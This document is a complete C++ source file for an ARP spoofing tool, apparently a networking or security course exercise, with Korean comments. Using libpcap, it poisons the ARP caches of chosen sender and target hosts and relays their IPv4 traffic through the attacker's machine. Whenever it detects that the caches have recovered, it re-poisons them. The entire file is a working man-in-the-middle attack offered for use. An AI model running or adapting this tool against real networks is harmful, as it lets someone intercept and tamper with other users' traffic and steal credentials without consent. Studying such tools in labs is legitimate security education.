#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstring>
#include <string>
#include <ctime>

pcap_t* handle;
char my_mac[20];

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("example: arp-spoof wlan0 192.168.0.2 192.168.0.1\n");
}

void get_my_mac(const char* dev, char* mac_buf) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    close(sock);
    unsigned char* hwaddr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(mac_buf, "%02x:%02x:%02x:%02x:%02x:%02x",
            hwaddr[0], hwaddr[1], hwaddr[2], hwaddr[3], hwaddr[4], hwaddr[5]);
}

int send_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest) {
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(isRequest ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
}

int get_mac(Ip ip, Mac& result) {
    send_arp(Mac("ff:ff:ff:ff:ff:ff"), Mac(my_mac), Mac::nullMac(), Ip("0.0.0.0"), ip, true);
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) return -1;
        EthHdr* eth = (EthHdr*)packet;
        if (eth->type() != EthHdr::Arp) continue;
        ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
        if (arp->op() == ArpHdr::Reply && arp->sip() == ip) {
            result = Mac(std::string(arp->smac()));
            return 0;
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 != 0)) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live error: %s\n", errbuf);
        return -1;
    }
    get_my_mac(dev, my_mac);

    int flow_count = (argc - 2) / 2;
    Ip sender_ip[flow_count], target_ip[flow_count];
    Mac sender_mac[flow_count], target_mac[flow_count];

    for (int i = 0; i < flow_count; i++) {
        sender_ip[i] = Ip(argv[2 + i * 2]);
        target_ip[i] = Ip(argv[3 + i * 2]);
        get_mac(sender_ip[i], sender_mac[i]);
        get_mac(target_ip[i], target_mac[i]);
        send_arp(sender_mac[i], Mac(my_mac), sender_mac[i], target_ip[i], sender_ip[i], false);
        send_arp(target_mac[i], Mac(my_mac), target_mac[i], sender_ip[i], target_ip[i], false);
    }

    time_t last = time(nullptr);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        EthHdr* eth = (EthHdr*)packet;

        // ARP 복구 탐지 → 재감염 (양방향 감지)
        if (eth->type() == EthHdr::Arp) {
            ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
            if (arp->op() == ArpHdr::Request) {
                for (int i = 0; i < flow_count; i++) {
                    bool is_sender_to_target = arp->sip() == sender_ip[i] && arp->tip() == target_ip[i];
                    bool is_target_to_sender = arp->sip() == target_ip[i] && arp->tip() == sender_ip[i];

                    if (is_sender_to_target || is_target_to_sender) {
                        send_arp(sender_mac[i], Mac(my_mac), sender_mac[i], target_ip[i], sender_ip[i], false);
                        send_arp(target_mac[i], Mac(my_mac), target_mac[i], sender_ip[i], target_ip[i], false);
                        printf("[ARP] Reinfected flow %d (sip=%s → tip=%s)\n",
                               i + 1,
                               std::string(arp->sip()).c_str(),
                               std::string(arp->tip()).c_str());
                    }
                }
            }
        }

        // IP 패킷 릴레이 + MAC 기반 복구 감지
        else if (eth->type() == EthHdr::Ip4) {
            for (int i = 0; i < flow_count; i++) {
                if (eth->smac_ == sender_mac[i]) {
                    if (eth->dmac_ != Mac(my_mac)) {
                        send_arp(sender_mac[i], Mac(my_mac), sender_mac[i], target_ip[i], sender_ip[i], false);
                        printf("[MAC] Reinfected sender %d (dst MAC changed)\n", i + 1);
                    } else {
                        eth->smac_ = Mac(my_mac);
                        eth->dmac_ = target_mac[i];
                        pcap_sendpacket(handle, packet, header->len);
                    }
                } else if (eth->smac_ == target_mac[i]) {
                    eth->smac_ = Mac(my_mac);
                    eth->dmac_ = sender_mac[i];
                    pcap_sendpacket(handle, packet, header->len);
                }
            }
        }

        // 주기적 감염 유지 코드 복구 (주석처리)
        /*
        time_t now = time(nullptr);
        if (now - last >= 10) {
            for (int i = 0; i < flow_count; i++) {
                send_arp(sender_mac[i], Mac(my_mac), sender_mac[i], target_ip[i], sender_ip[i], false);
                send_arp(target_mac[i], Mac(my_mac), target_mac[i], sender_ip[i], target_ip[i], false);
            }
            last = now;
            printf("[PERIODIC] Infection sent\n");
        }
        */
    }
    pcap_close(handle);
    return 0;
}
